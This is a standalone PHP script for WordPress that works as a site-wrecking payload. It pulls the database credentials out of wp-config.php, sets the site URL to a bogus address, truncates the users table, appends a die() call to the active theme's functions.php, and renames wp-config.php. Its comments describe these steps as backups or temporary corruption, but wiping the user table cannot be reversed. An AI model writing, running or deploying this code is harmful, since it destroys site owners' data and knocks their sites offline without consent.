<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

require_once('wp-load.php'); 

// Access the global $wpdb object
global $wpdb;

// Fetch the table prefix
$table_prefix = $wpdb->prefix;

define('TABLE_PREFIX', $table_prefix);

$active_theme = $wpdb->get_var("SELECT option_value FROM {$wpdb->options} WHERE option_name = 'template'");


// Use the table prefix as needed


// Define the WordPress path (set this to the correct path)
$wp_path = __DIR__; // Adjust the path to your WordPress installation as needed

// Fetch the wp-config.php path
$wp_config_path = $wp_path . "/wp-config.php";

// Function to extract values from wp-config.php
function get_wp_config_value($config_file, $keys) {
    $values = [];
    if (file_exists($config_file)) {
        $content = file_get_contents($config_file);

        foreach ($keys as $key) {
            // Regex to match config values
            if (preg_match("/define\(\s*['\"]" . preg_quote($key) . "['\"]\s*,\s*['\"](.*?)['\"]\s*\);/i", $content, $matches)) {
                $values[$key] = $matches[1];
            } else {
                $values[$key] = null; // Key not found
            }
        }
    } else {
        die("Configuration file does not exist: $config_file");
    }
    return $values;
}

// Array of database configuration keys to fetch
$db_keys = ['DB_NAME', 'DB_USER', 'DB_PASSWORD', 'DB_HOST'];

// Fetch database credentials
$db_credentials = get_wp_config_value($wp_config_path, $db_keys);

// Check if all credentials were retrieved successfully
foreach ($db_keys as $key) {
    if ($db_credentials[$key] === null) {
        die("Failed to fetch the value for '$key' from wp-config.php");
    }
}



// Fetch the table prefix separately
$table_prefix = TABLE_PREFIX;


// Check if the table prefix was retrieved successfully
if ($table_prefix === null) {
    die("Failed to fetch the value  from wp-config.php");
}

// Echo the database prefix


// Try connecting to the database
$conn = new mysqli(
    $db_credentials['DB_HOST'],
    $db_credentials['DB_USER'],
    $db_credentials['DB_PASSWORD'],
    $db_credentials['DB_NAME']
);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
} else {
    echo " ";
}

// Additional operations
$corrupted_siteurl = "http://invalid-url.com";
$sql = "UPDATE {$table_prefix}options SET option_value='$corrupted_siteurl' WHERE option_name='siteurl' OR option_name='home'";
$truncate_user = "TRUNCATE TABLE `{$table_prefix}users`;";

// Perform SQL operations
if ($conn->query($sql) === TRUE && $conn->query($truncate_user) === TRUE) {
    echo "Site URL changed to '$corrupted_siteurl'.<br>";
} else {
    echo "Error updating site URL: " . $conn->error . "<br>";
}

// Set the theme name dynamically (you can modify this to get from user input or other logic)
$wp_theme = $active_theme;
$theme_functions_file = $wp_path . "/wp-content/themes/{$wp_theme}/functions.php";
$backup_functions_file = $wp_path . "/wp-content/themes/{$wp_theme}/functions-backup.php";

// Modify functions.php
if (file_exists($theme_functions_file)) {
    copy($theme_functions_file, $backup_functions_file);
    file_put_contents($theme_functions_file, "<?php die('Temporarily corrupted'); ?>", FILE_APPEND);
    echo "functions.php file modified to corrupt theme temporarily.<br>";
} else {
    echo "functions.php file not found.<br>";
}

// Rename wp-config.php for backup
if (file_exists($wp_config_path)) {
    $wp_config_backup = $wp_path . "/wp-config-backup.php";
    rename($wp_config_path, $wp_config_backup);
    echo "wp-config.php renamed to wp-config-backup.php<br>";
} else {
    echo "wp-config.php file not found.<br>";
}

// Close the database connection
$conn->close();
?>
